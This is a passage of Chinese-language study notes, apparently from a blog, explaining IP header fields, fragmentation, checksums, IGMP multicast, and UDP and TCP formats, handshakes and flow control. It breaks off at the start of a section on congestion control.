bit，数据报计数器</p><blockquote><p>IP软件在存储器中维持一个计数器，每产生一个数据报，计数器加1，并将此值赋给标识字段。<br>当数据报由于长度超过网络MTU而必须分片时，标识字段的值就被复制到所有的数据报分片的标识字段中。<br>相同的标识字段的值使分片后的各数据报片能正确重组成原来的数据报。</p></blockquote><p>标志: 3 bit，目前只有两位有意义</p><blockquote><ul><li>第一位保留。</li><li>中间一位记为DF，为不分片标志，只有当DF=0时才允许分片。</li><li>最后一位为MF，MF=1表示后面还有分片，MF=O表示这是最后一个数据报片。</li></ul></blockquote><p>偏移量:13 bit，较长的分组被分片后，某分片在原分组中的相对位置。片偏移以8个字节为单位。每个分片的长度必须是8的整数倍。</p><p>生存时间:8 bit，记为TTL (Time To Live)</p><blockquote><ul><li><p>表明数据报在网络中的寿命，其单位为秒。现在TTL的单位是跳数，指明数据报在因特网中至多可经过多少个路由器，最大值为255，通常为32、64、128。</p></li><li><p>当TTL值为1时，表示这个数据报只能在本局域网内传送，因为这个数据报传送到局域网上的某个路由器，在被转发之前TTL值就减小到0，因而会被路由器丢弃。</p></li></ul></blockquote><p>协议: 8 bit，指出此数据报携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给对应的进程处理。</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E9%AB%98%E5%B1%82%E5%8D%8F%E8%AE%AE.png"></p><p>首部检验和:16 bit，检验数据报的首部，不包括数据部分。采用简单的16位反码求和的计算方法。</p><p>源IP地址: 32bit，定义了源主机的IP地址。在IP数据包从源主机传送到目的主机期间，该字段保持不变。</p><p>目的IP地址: 32bit，定义了目的主机的IP地址。在IP数据报从源主机传送到目的主机期间，该字段保持不变。</p><h3 id="IP数据报分片："><a href="#IP数据报分片：" class="headerlink" title="IP数据报分片："></a>IP数据报分片：</h3><p>数据包可能经过多个不同的网络，每一个路由器把收到的帧进行拆装，处理后又封装成另一个帧。<br>收到帧的格式与长度取决于这个帧刚经过的物理网络所使用的协发<br>送出去的帧的格式与长度取决于这个帧将要经过的物理网络所使用的协议。</p><p><strong>最大传输单元MTU</strong>：不同网络所能传送的数据包的最大长度是不同的，这个最大长度叫做最大传输单元MTU ( Maximum Transmission Unit ) </p><blockquote><p style="color:orange;">MTU即该网络的数据链路层帧的数据部分的最大长度。</p></blockquote><h4 id="分片："><a href="#分片：" class="headerlink" title="分片："></a>分片：</h4><blockquote><ul><li><p>对于物理网络，如果数据包的长度超过了MTU，就要把数据部分进行分片。</p></li><li><p>每个分片都有自己的首部。</p></li><li><p>如果已经分片的数据包要经过更小MTU的网络，那么这些已经分片的数据包还可再进行分片，数据包在到达最后终点之前可以经过多次的分片。</p></li><li><p style="color:red;">数据包可以被源主机或在其路径上的路由器进行分片，但是数据包的重装只能在目的主机上进行。</p></li></ul></blockquote><h4 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h4><h5 id="目的主机进行分片重组"><a href="#目的主机进行分片重组" class="headerlink" title="目的主机进行分片重组"></a>目的主机进行分片重组</h5><blockquote><p style="color:blue;">IP规定，数据报分片的重组地点是目的主机，中间路由器不对任何被分片的数据报进行重组，即使其转发接口的MTU非常大。</p></blockquote><blockquote><p>优点:<br>简化了路由软件的操作，提高了路由器的处理效率。<br>可以避免重复分片。在数据报投递过程中，途经网络的MTU是不可预知的</p></blockquote><blockquote><p>缺点<br>浪费带宽。因为每个分片都要有一个首部，分片越多，首部开销越大。<br>增加了数据包丢失的可能性。分片越多，丢失的可能性越大。一旦丢失了一个分片，整个数据报就必须重新传输。</p></blockquote><h5 id="分片重组："><a href="#分片重组：" class="headerlink" title="分片重组："></a>分片重组：</h5><p>有关的三个字段是:标识字段、标志字段和偏移量字段。</p><p>当目的主机收到一个数据报时，可以根据偏移量和MF位判断:</p><ul><li>片偏移不为0，表明它是一个分片;</li><li>如果片偏移为0，且MF位为1，表明它是第一个分片;</li><li>如果片偏移为0，且MF位为0，则表明它是一个完整的数据报。</li></ul><p>根据数据报首部“标识”字段的值，可判断哪些分片属于同一个原始数据报片偏移用来确定分片在原始数据报中的位置。</p><h5 id="重组定时器："><a href="#重组定时器：" class="headerlink" title="重组定时器："></a>重组定时器：</h5><p>为防止因等待一个丢失的分片而无限期延长重组过程，在重组分片时启动一个定时器,如果超时后仍然没有收到一个数据报的全部分片，则该数据报被丢弃。<br>IP数据报校验和：</p><blockquote><p style="color:blue;">校验和：数据包上的附加信息，能够识别数据包在传输过程中是否出错。</p></blockquote><p>发送端先计算校验和，并把得到的结果与数据包一起发送出去。接收端对数据包进行同样的计算。若结果正确，则接受这个数据包，否则就丢弃它。</p><h4 id="校验和的计算："><a href="#校验和的计算：" class="headerlink" title="校验和的计算："></a>校验和的计算：</h4><p>发送端：将数据包按16位分段。把这些段用反码算术运算相加，将相加后得到的和再取反码就得出了校验和。<br>接收端：把收到的数据包按16位分段，并把这些段相加。得到的和取反码。若结果为0，则接受这个数据包，否则拒绝这个数据包。</p><img src="./网际协议IP/校验计算.png" style="zoom: 50%;" /><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><blockquote><blockquote><p style="color:blue;">IP数据包的校验和只校验IP首部部分而不校验IP数据部分。</p></blockquote><ul><li>首先，所有将数据封装在IP数据报中的高层协议，都有覆盖整个数据包的校验和。因此，IP数据报的校验和就不必再检验所封装的数据部分。</li><li>其次，每经过一个路由器，IP数据包的首部就要改变一次，但数据部分不改变。因此若校验和包含数据部分，这就意味着路由器要花费很多时间计算没有改变的数据部分的校验和。</li></ul></blockquote><h2 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a>Internet组管理协议IGMP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握IGMP协议的报文格式</span><span class="token comment"># 掌握IGMP协议的工作原理</span><span class="token comment"># 理解多播组地址到以太网地址的映射</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="单播与多播与广播"><a href="#单播与多播与广播" class="headerlink" title="单播与多播与广播:"></a>单播与多播与广播:</h3><blockquote><p style="color:red;">单播(unicast):    单个源站与单个目的站之间的通信叫作单播，IP数据报中的源IP地址和目的IP地址分别代表了源站和目的站。</p></blockquote><blockquote><p style="color:blue;">绝大多数的网络应用程序是单播</p></blockquote><blockquote><p style="color:red;">多播/组播(multicast): 一个源站和多个目的站之间的通信叫作多播。</p></blockquote><blockquote><ul><li>IP数据报中的源地址是单播地址，目的地址是组地址(D类地址)</li><li>路由器收到组播数据包后，可从它的多个接口转发出去<br>目前，组播机制没有被广泛支持，主要的组播路由机制有距离向量多播路由协议(DVMRP)和协议无关组播(PIM) .</li></ul></blockquote><blockquote><p style="color:red;">广播(broadcast):广播源站和目的站是一对多的，源站只有一个，但所有其它主机都是目的站Internet不支持广播，因为这会产生非常大的通信量</p></blockquote><h4 id="组播"><a href="#组播" class="headerlink" title="组播:"></a>组播:</h4><p>优点：采用组播技术后，即使用户数量成倍增长，主干网带宽不需要随之增加。从而解决了宽带应用对带宽和服务质量的要求问题</p><img src="./网际协议IP/组播示意.png" style="zoom: 33%;" /><p>组播比多个单播具有更小的分组时延</p><h5 id="组播地址范围："><a href="#组播地址范围：" class="headerlink" title="组播地址范围："></a>组播地址范围：</h5><blockquote><ol><li>IANA(国际因特网地址分配委员会）把D类地址空间用于IP组播地址</li><li>IP组播地址的范围是:224.0.0.0~239.255.255.255</li><li>常用的组播地址<ul><li>224.0.0.1        在本子网上的所有参加多播的主机和路由器</li><li>224.0.0.2        在本子网上的所有参加多播的路由器</li><li>224.0.0.5        用来给一个网段中所有的OSPF路由器发送OSPF路由信息</li><li>224.0.0.9        RIPv2组地址</li><li>224.0.0.11      供DHCP服务器和中继代理使用</li></ul></li></ol></blockquote><h5 id="动态的组成员"><a href="#动态的组成员" class="headerlink" title="动态的组成员"></a>动态的组成员</h5><blockquote><p style="color:orange;">多播组中的成员是动态的。一个进程可请求其主机参加某个特定组，或在任意时间退出该组</p></blockquote><h5 id="使用硬件进行多播"><a href="#使用硬件进行多播" class="headerlink" title="使用硬件进行多播"></a>使用硬件进行多播</h5><blockquote><p style="color:orange;">当数据报传送到以太网时，以太网利用硬件进行多播，交付给属于该组成员的主机</p></blockquote><h4 id="多播组地址到以太网地址的转换"><a href="#多播组地址到以太网地址的转换" class="headerlink" title="多播组地址到以太网地址的转换"></a>多播组地址到以太网地址的转换</h4><p>多播以太网地址的前25位是0000000100000000010111100这意味着与IP多播相对应的以太网地址范围从01005E000000到01005E7FFFFF。然后将多播IP地址的低23位映射到以太网地址中的低23位。</p><img src="./网际协议IP/多播地址到以太网地址的转换.png" style="zoom: 50%;" /><p>由于D类地址的组标识字段长为28bit，将低23位复制到多播MAC地址中，有5bit未使用，所以<strong>映射是多对一的</strong>。</p><p><strong>32个多播IP地址映射到一个以太网多播地址</strong>。既然地址映射不是惟一的，那么设备驱动程序或lP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能,设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</p><h3 id="IGMP协议简介："><a href="#IGMP协议简介：" class="headerlink" title="IGMP协议简介："></a>IGMP协议简介：</h3><p>IGMP ( lnternet Group Management Protocol)协议，IGMP位于网络层。</p><p style="color:orange;">IGMP协议运行于主机和主机直接相连的路由器之间，是IP主机用来报告多播组成员身份的协议</p>利用IGMP协议，一方面可以使主机通知本地路由器希望加入并接收某个特定多播组的信息;另一方面，路由器可以周期性地查询局域网内某个已知组的成员是否处于活动状态。IGMP使用预留的组播地址224.0.0.1与本地路由器通信。<h3 id="IGMP报文格式："><a href="#IGMP报文格式：" class="headerlink" title="IGMP报文格式："></a>IGMP报文格式：</h3><p>IGMP协议目前有三个版本IGMP、IGMPv2和IGMPv3。</p><p>其中IGMPv2有3种报文类型:</p><blockquote><p>查询报文:路由器查询多播组中是否有活跃成员，分为一般查询和特定查询</p><p>成员关系报告报文:加入多播组或响应查询报文。</p><p>退出报告报文:离开多播组。</p></blockquote><h4 id="IGMPv2报文格式："><a href="#IGMPv2报文格式：" class="headerlink" title="IGMPv2报文格式："></a>IGMPv2报文格式：</h4><img src="./网际协议IP/IGMPv2报文格式.png" style="zoom:67%;" /><ol><li><p>类型:定义了IGMP报文类型</p><img src="./网际协议IP/IGMP报文类型.png" style="zoom: 80%;" /></li><li><p>响应时间:规定查询必须在多长时间内回答，以十分之一秒为单位。默认值为10秒。在查询报文中，这个值不为0，在其它报文中此字段值为0</p></li><li><p>检验和:对整个IGMP报文进行检验，算法同IP数据报</p></li><li><p>组地址:在一般查询报文中值为0。在特殊的查询报文、成员关系报告报文以及退出报文中值为相应的多播组地址</p></li></ol><h4 id="IGMP的封装"><a href="#IGMP的封装" class="headerlink" title="IGMP的封装"></a>IGMP的封装</h4><p>IGMP报文被封装在IP数据报中，IP层有3个字段需要注意:</p><blockquote><ul><li>协议类型:值为2，高层协议类型为2的IP数据包，其数据部分要交给IGMP协议处理。</li><li>生存时间:值为1，保证了这个报文不离开这个局域网。因为IGMP的作用范围是局域网，IGMP报文不能够发送到局域网以外的地方。</li><li>目的IP地址:为D类组播地址。</li></ul></blockquote><h3 id="多播组成员的加入和退出："><a href="#多播组成员的加入和退出：" class="headerlink" title="多播组成员的加入和退出："></a>多播组成员的加入和退出：</h3><h4 id="加入一个组"><a href="#加入一个组" class="headerlink" title="加入一个组"></a>加入一个组</h4><p>每个主机维护一张成员关系表，成员关系表是**&lt;进程名，组名&gt;<strong>表项的集合。当一个进程P要加入一个新组MG时，就向主机发出申请，主机就在成员关系表中增加</strong>&lt;P, MG&gt;**表项。</p><blockquote><ul><li>如果MG在表中不存在，主机就发送成员关系报告报文</li><li>如果MG在表中已经存在，那就不必发送成员关系报告报文，因为主机已经是MG这个组的成员了</li></ul></blockquote><img src="./网际协议IP/加入多播组.png" style="zoom:67%;" /><p>路由器也维护一个多播地址表，给出了连接到每一个接口的成员关系。如果对于这些接口中的一个组有兴趣时，路由器就发送成员关系报告报文，以记录连接在它的接口上的所有的多播组。<br>IGMP协议要求把成员关系报告报文在很短的时间内发送两次。这样，如果第一个报文丢失或受到损伤，那么第二个报文可以代替它。</p><h4 id="退出一个组"><a href="#退出一个组" class="headerlink" title="退出一个组"></a>退出一个组</h4><ol><li><p>当主机发现在一个群组MG中已经没有进程时，就发送退出报告报文，多播路由器收到该报告。当路由器发现在一个特定组中已经没有连接在它的接口上感兴趣的网络，它就发送退出这个组的报告。</p></li><li><p>多播路由器收到退出报告报文时，并不立即删除这个群组MG，而是发送针对MG的查询报文，因为这个退出群组报告仅仅是从一个站点发送来的，可能还有其他站点仍然需要这个群组。</p></li><li><p>若在指定时间内没有收到站点对该群组的成员关系报告，就意味着在本网络上没有这个群组MG的成员，删除这个群组。</p><img src="./网际协议IP/退出多播组.png" style="zoom:67%;" /></li></ol><h4 id="监视组成员关系"><a href="#监视组成员关系" class="headerlink" title="监视组成员关系"></a>监视组成员关系</h4><blockquote><ul><li>当仅有一台主机留在一个组中时，如果这台主机离开了这个组而没有发送退出报告报文，那么多播路由器将永远收不到退出报告报文，它认为这个组一直存在这个成员。</li></ul></blockquote><p>多播路由器负责监视局域网上的所有主机或路由器,多播路由器周期性地发送<strong>一般查询报文</strong>，在这个报文中，组地址被置为<strong>0.0.0.0</strong>。</p><p>路由器期望着在它的组表中的每一个组的回答，甚至新的组也可以回答。查询报文的最大响应时间是10秒。当主机路由器收到一般查询报文时，如果它对一个组感兴趣，就发送成员关系报告报文。</p><h4 id="延迟响应"><a href="#延迟响应" class="headerlink" title="延迟响应"></a>延迟响应</h4><blockquote><p style="color:blue;">IGMP使用延迟响应策略，避免不必要的通信量。当主机或路由器收到查询报文时，它不是立即响应，而是延迟响应</p></blockquote><p>主机或路由器使用一个随机数产生计时器，它的截止时间是1～10秒。截止时间可以使用1秒或更短的步长。</p><p>表中的每一个组都设置计时器。每个主机或路由器在发送成员关系报告报文之前都要等待它的计时器到时。在这段等待时间中，如果在同一组中的其它主机或路由器的计时器先到了截止时间，那么这个主机或路由器就发送成员关系报告报文。因为这个报文是广播发送的，等待的主机或路由器都能收到这个报文，并知道没有必要对这个组发送重复的报文;因此，等待的主机或路由器就取消发送成员关系报告。</p><h2 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a>传输层协议TCP与UDP</h2><h3 id="进程间通信："><a href="#进程间通信：" class="headerlink" title="进程间通信："></a>进程间通信：</h3><blockquote><p style="color:orange;">点到点的通信:IP协议负责主机到主机的通信。作为网络层协议，IP协议只能把报文交付给目的主机。</p></blockquote><blockquote><p style="color:orange;">端到端的通信：运输层协议负责进程到进程的通信。TCP和UDP协议负责把报文交付到正确的进程。</p></blockquote><img src="./网际协议IP/进程间通信.png" style="zoom:80%;" /><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号:"></a>端口号:</h4><p>主机是用IP地址来标识的，而要标识主机中的进程，就需要使用端口号。TCP/IP协议族中，端口号占16 bit，用0~65535之间的整数标识。TCP和UDP是两个独立的软件模块，因此各自的端口号也相互独立。·端口号只具有本地意义，不同计算机的相同端口号是没有联系的。</p><h5 id="三类端口号："><a href="#三类端口号：" class="headerlink" title="三类端口号："></a>三类端口号：</h5><ul><li>熟知端口，数值为0~1023，用于标识服务器进程。</li><li>登记端口号，数值为1024~49151，为没有熟知端口号的服务器进程使用。使用这个范围的端口号必须在IANA登记，以防止重复。</li><li>客户端口号或短暂端口号，数值为49152~65535，留给客户进程选择暂时使用，一般由应用程序开发者指定或由操作系统随机分配一个未使用的端口号。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其它客户进程使用。</li></ul><h5 id="UDP的熟知端口号："><a href="#UDP的熟知端口号：" class="headerlink" title="UDP的熟知端口号："></a>UDP的熟知端口号：</h5><img src="./网际协议IP/UDP的熟知端口号.png" style="zoom:80%;" /><h5 id="套接字："><a href="#套接字：" class="headerlink" title="套接字："></a>套接字：</h5><p>为了使多主机、多进程通信时不发生混乱，必须把主机的IP地址和端口号结合起来使用，称为<strong>套接字(Socket)</strong>.</p><blockquote><p>客户套接字地址唯一地定义了客户进程;服务器套接字地址唯一地定义了服务器进程;TCP与UDP都使用套接字通信;</p></blockquote><p>套接字包括**IP地址(32位)<strong>和</strong>端口号(16位)**，共48位.进行通信的一对套接字在整个Internet中是唯一的。</p><img src="./网际协议IP/套接字.png"  /><blockquote><p style="color:orange;">面向连接的服务：进行数据交换前，先建立连接，传输结柬后释放连接</p></blockquote><ol><li>建立连接阶段:在有关协议数据单元中，须给出源用户与目的用户的完整地址，同时可协商服务质量等选项。</li><li>数据交换阶段:这个阶段，每个报文中不必包含用户完整的地址，而是使用一个连接标识符来代替。报文的发送和接收都是按顺序进行的，发送方先发送的报文，在接收方先收到。</li><li>释放连接阶段:通过相应的协议数据单元完成释放操作。</li></ol><blockquote><p style="color:orange;">无连接的服务：两个实体通信前不必先建立连接。</p></blockquote><blockquote><p>无连接服务灵活方便，但不能防止报文的丢失、重复和乱序。·每个报文必须包含完整的源地址和目的地址，因此开销较大。</p></blockquote><h3 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握UDP协议的报文格式#掌握UDP协议校验和的计算方法#理解UDP协议的优缺点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="UDP协议简介："><a href="#UDP协议简介：" class="headerlink" title="UDP协议简介："></a>UDP协议简介：</h4><blockquote><p style="color:blue;">UDP (User Datagram Protocol，用户数据报协议）提供无连接的传输服务，对等的UDP实体在传输时不建立端到端的连接，只是简单地发送或接收数据报</p></blockquote><p>UDP协议直接位于IP协议的上层，属于运输层协议。<br>UDP协议不提供端到端的确认和重传功能，它不保证数据包一定能到达目的地，因此是不可靠协议，使用UDP的程序可根据自己的需求设计相应的可靠性机制，如TFTP。</p><h5 id="UDP协议的特点"><a href="#UDP协议的特点" class="headerlink" title="UDP协议的特点"></a>UDP协议的特点</h5><p>发送数据之前不需要建立连接，UDP主机不需要维持复杂的连接状态表。</p><p>UDP用户数据报只有8个字节的首部开销。<br>网络的拥塞不会使源主机的发送速率降低，这对某些实时应用是很重要的。·当数据包在传送过程中发生错误时UDP不能报告错误。<br>UDP保留应用程序定义的报文边界，当应用程序把一块数据交给UDP发送时，这块数据将作为独立的单元到达对方的应用程序，因此，应用程序必须关心IP数据报的长度。</p><h4 id="UDP报文格式："><a href="#UDP报文格式：" class="headerlink" title="UDP报文格式："></a>UDP报文格式：</h4><img src="./网际协议IP/UDP报文格式.png" style="zoom: 67%;" /><p>首部字段和数据字段。首部字段8个字节，由4个字段组成，每个字段2字节</p><ol><li>源端口:表示发送端的端口号。不同的应用程序使用不同的端口号，实现了同一时间段内多个应用程序可以一起使用网络进行数据的发送和接收。</li><li>目的端口:表示数据包被发往的目的端的端口号。</li><li>有效负载长度:包括UDP首部和UDP数据在内的整个用户数据报的长度。该字段的最小值是8，一些UDP实现将数据报的大小限制到了8192字节。</li><li>校验和:UDP的校验的校验范围包括伪首部（IP首部的部分字段)、UDP首部和UDP数据，该字段是可选的。如果该字段值为零就说明不进行校验。</li></ol><p>UDP用户数据报封装在IP数据报中，IP数据报的“协议类型”字段的值是17，表示数据部分是从UDP协议来的。</p><img src="./网际协议IP/UDP封装.png" style="zoom:67%;" /><h5 id="UDP校验和的计算"><a href="#UDP校验和的计算" class="headerlink" title="UDP校验和的计算"></a>UDP校验和的计算</h5><blockquote><p style="color:blue;">UDP校验和的计算与IP和ICMP校验和的计算不同。UDP校拉和T拉H围包括三部分:伪首部、UDP首部以及从应用层来的数据。</p></blockquote><p>伪首部是IP首部的一部分，其中有些字段要填入0。若校演和不包括伪首部，用户数据报也可能是安全的和正确的。但是，若lP首部受到损伤，则它可能被交付到错误的主机。</p><p>伪首部中的高层协议类型是为了确保这个数据报是属于UDP而不是是属丁于TCP。UDP的高层协议类型是17，若这个值在传输过程中出错，接收端就能检出并丢弃这个数据包，从而不会交付给错误的协议。</p><h4 id="UDP的应用："><a href="#UDP的应用：" class="headerlink" title="UDP的应用："></a>UDP的应用：</h4><p>UDP适用于这样的进程，它需要简单的请求—响应通信，而较少考虑流量控制和差错控制。对于需要传送成块数据的进程，如FTP，则通常不使用UDP。<br>UDP适用于具有内部流量控制和差错控制机制的进程。对多播和广播来说，UDP是个比较合适的传输层协议。UDP可用于管理进程，如SNMP协议。<br>UDP可用于某些路由选择更新协议，如RIP协议。</p><h3 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握TCP协议的报文格式</span><span class="token comment"># 掌握TCP连接的建立和释放过程</span><span class="token comment"># 掌握TCP数据传输中编号与确认的过程掌握TCP协议校验和的计算方法</span><span class="token comment"># 理解TCP重传机制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TCP协议简介："><a href="#TCP协议简介：" class="headerlink" title="TCP协议简介："></a>TCP协议简介：</h4><p>TCP协议是TCP/IP协议族中的面向连接的、可靠的、端到端的运输层协议。</p><p>TCP提供全双工服务，全双工连接包括两个独立的、方向相反的数据流。与UDP不同，TCP允许发送和接收字节流形式的数据。为了使服务器和客户端以不同的速度双向发送和接收数据，TCP提供了发送和接收两个缓冲区。TCP在报文中加上一个递增的确认序列号来告诉发送端，接收端期望收到的下一个报文，如果在规定时间内，没有收到关于这个包的确认响应，则重新发送此包，这保证了TCP是一种可靠的传输层协议。</p><img src="./网际协议IP/TCP的熟知端口号.png" style="zoom:50%;" /><h4 id="TCP报文格式："><a href="#TCP报文格式：" class="headerlink" title="TCP报文格式："></a>TCP报文格式：</h4><img src="./网际协议IP/TCP报文格式.png" style="zoom: 50%;" /><p>源端口:2字节，主机中发送这个报文的应用程序端口号。</p><p>目的端口:2字节，目的主机中接收这个报文的应用程序的端口号。</p><p>序列号:4字节，定义了指派给本报文第一个数据字节的一个序号。TCP是流式传输协议，为了保证连通性，要在发送的每一个字节上编号。序号指定了这个序列中的哪一个字节是报文的第一个字节。在连接建立时，双方使用随机数产生器产生初始序号，通常每一方的初始序号都是不同的。</p><p>确认号:4字节，接收端期望收到的下一个报文段中数据部分的第一个字节的序号。</p><p>首部长度:4位，指定TCP首部的长度，以4字节为单位。首部长度可以在20~60字节之间。因此，这个字段的值可以在5至15之间。<br>保留字段:4位，保留为今后使用，目前应置为0。<br>控制字段:定义了8种不同的标志。用在TCP的流量控制、连接建立和终止以及数据传送的方式等方面。在同一时间可设置一位或多位标志。</p><img src="./网际协议IP/TCP的控制字段.png" style="zoom:67%;" /><img src="./网际协议IP/\TCP控制字段具体信息.png" style="zoom: 50%;" /><p>窗口:2字节，窗口字段用来控制对方发送的数据量，单位为字节。TCP连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。这时，发送端必须服从接收端的决定。</p><p>检验和:2字节，检验的范围包括首部和数据这两部分。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。</p><p>紧急指针:2字节，只有当URG=1时才有效，指出在本报文段中的紧急数据的最后一个字节的序号，使接收方知道紧急数据共有多少字节(紧急数据结束后是普通数据)。发送方TCP即使发送窗口为0，也要对带有URG标志的数据段实行强制发送。</p><p>选项:长度可变，最多40字节。</p><p>最大报文段长度MSS (Maximum Segment Size)。</p><blockquote><ul><li> TCP报文段中的数据字段的最大长度。</li><li> 与接收窗口值没有关系，不是考虑接收方的缓存是否可以放下TCP报文段中的数据。</li><li> 目的是提高网络的利用率，使TCP报文段携带的数据尽可能多，以提高分组中数据部分所占的比例。</li><li> MSS应该尽可能大，只要在IP层不需要进行分片即可。但由于传输路径的动态性，很难确定最佳MSS。</li><li> 连接建立时，双方把自己能够支持的MSS通知对方，默认值是536 Byte。因此所有主机都能接受的报文段长度是556 Byte。</li></ul></blockquote><p>填充:为了使整个首部长度是4字节的整数倍，全0填充。</p><h5 id="TCP的封装："><a href="#TCP的封装：" class="headerlink" title="TCP的封装："></a>TCP的封装：</h5><p>TCP报文封装在lP数据报中，IP数据报的“协议类型”字段的值是6</p><img src="./网际协议IP/TCP的封装.png" style="zoom:67%;" /><h4 id="TCP链接的建立与释放："><a href="#TCP链接的建立与释放：" class="headerlink" title="TCP链接的建立与释放："></a>TCP链接的建立与释放：</h4><blockquote><p style="color:blue;">连接的三个阶段:连接建立、数据传送和连接释放。连接建立</p></blockquote><p>服务器首先准备接收TCP连接，这个过程叫做被动打开。这时的服务器的TCP已经准备好接受任何一台主机的TCP连接了。客户程序发出TCP请求的过程叫做主动打开。然后服务器与客户端就开始三次握手过程。</p><h5 id="三次握手建立连接："><a href="#三次握手建立连接：" class="headerlink" title="三次握手建立连接："></a>三次握手建立连接：</h5><p>1．客户发送第一个报文，这是一个SYN报文，在这个报文中只有SYN标志置为1，这个报文的作用是使序号同步。</p><img src="./网际协议IP/第一次握手.png" style="zoom:50%;" /><p>2．服务器发送第二个报文，即SYN+ACK报文，其中SYN和ACK标志被置为1首先，它是一个用来和对方进行通信的SYN报文。服务器使用这个报文同步初始序号，以便从服务器向客户发送字节。服务器还使用ACK标志确认已从客户端收到了SYN报文，同时给出期望从客户端收到的下一个序号。另外，服务器还定义了客户端要使用的接收窗口的大小。</p><img src="./网际协议IP/第二次握手.png" style="zoom:50%;" /><p>3．客户发送第三个报文。这仅仅是一个ACK报文。它使用ACK标志和确认号字段来确认收到了第二个报文。<br>然后客户端就可以通知上层应用进程，连接已经建立。服务器收到客户机的确认后，也通知上层应用进程，连接已经建立。</p><img src="./网际协议IP/第三次握手.png" style="zoom:50%;" /><h5 id="半关闭的四次握手方式终止连接："><a href="#半关闭的四次握手方式终止连接：" class="headerlink" title="半关闭的四次握手方式终止连接："></a>半关闭的四次握手方式终止连接：</h5><blockquote><p style="color:blue;">半关闭:TCP连接中，一方可以终止发送数据，但仍然保持接收数据，称为半关闭。半关闭通常是由客户端发起的。</p></blockquote><p><strong>半关闭的过程</strong></p><ol><li>客户发送FIN报文，半关闭了这个连接</li><li>服务器发送ACK报文接受了这个半关闭。但是，现在服务器仍然可以发送数据</li><li>当服务器已经把所有处理的数据都发送完毕时，就发送FIN报文</li><li>客户端发送ACK报文给予确认。<ul><li>在半关闭一条连接后，客户端仍然可以接收服务器发送的数据，而服务器也可以接收客户端发送的确认。但是，客户端不能传送数据给服务器。</li></ul></li></ol><img src="./网际协议IP/半关闭的四次握手方式终止连接.png" style="zoom:50%;" /><h4 id="流量控制："><a href="#流量控制：" class="headerlink" title="流量控制："></a>流量控制：</h4><p>发送端收到接收端的确认报文之前，对发送端发送的数据量进行管理</p><p>在不考虑流量控制的情况下，传输层协议可以每次只发送一个字节的数据，然后在发送下一个字节数据之前等待接收端的确认报文。这是一个非常缓慢的过程，发送端在等待确认报文时一直处于空闲状态。<br>还有一种情况是传输层协议一次就将全部数据发送出去，而不理会确认报文。这样虽然加速了发送过程，但可能会使接收端来不及接收而瘫痪。此外，若有一部分数据丢失、重复、失序或损坏，发送端就要一直等到接收端将全部数据都检查完毕后才能知道。</p><h4 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h4><p>TCP的流量控制在缓存上定义了一个窗口，称为滑动窗口，窗口大小的单位是字节，TCP发送数据的多少由滑动窗口决定。</p><p>TCP报文段首部的窗口字段就是给发送方设置的发送窗口的上限。</p><p>发送窗口在连接建立时由双方商定，在通信过程中动态调整。</p><p>如果发送方收到接收方的窗口大小U HIr以人tx’P送数据（带URG标志的数据段除外）。</p><img src="./网际协议IP/滑动窗口.png" style="zoom:67%;" /><p>发送端只要收到了对方的确认，发送窗口就可前移。<br>发送TCP维护一个指针。每发送一个报文段，指针向前移动一个报文段的距离。</p><blockquote><p style="color:red;">滑动窗口的右沿可以向左移动吗?</p>**滑动窗口的右沿向左移动通常发生在对方通知窗口缩小时**。使某些可以发送的数据变成不能发送，如果发送端已经发送了这些数据，就会产生错误。<p>TCP标准强烈不赞成这样做。</p></blockquote><blockquote><p style="color:red;">滑动窗口的左沿可以向左移动吗?</p>**窗口的左沿不能向左移动**，因为这表示已经发送出去的并且经过确认的数据现在又要回收了</blockquote><h4 id="拥塞控制："><a href="#拥塞控制：" class="headerlink" title="拥塞控制："></a>拥塞控制：</h4><h5 id="拥塞控制与流量控制的对比"><a href="#拥塞控制与流量控制的对比" class="headerlink" title="拥塞控制与流量控制的对比:"></a>拥塞控制与流量控制的对比:</h5><blockquote><p style="color:blue;">出现资源拥塞的条件:    对资源需求的总和>可用资源</p></blockquote><ul><li>防止过多的数据注入到网络中，可以使路由器或者链路不至于过载。</li><li>拥塞控制是一个<strong>全局性</strong>的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。</li></ul><p><strong>流量控制：</strong>在给定的发送端和接收端之间的<strong>点对点通信量的控制</strong>。</p><ul><li>流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收</li></ul><h5 id="拥塞控制的作用："><a href="#拥塞控制的作用：" class="headerlink" title="拥塞控制的作用："></a>拥塞控制的作用：</h5><img src="./网际协议IP/拥塞控制.png" style="zoom:50%;" /><h5 id="拥塞控制方法"><a href="#拥塞控制方法" class="headerlink" title="拥塞控制方法"></a>拥塞控制方法</h5><blockquote><p style="color:black;">慢开始:        初始设置拥塞窗口cwnd = 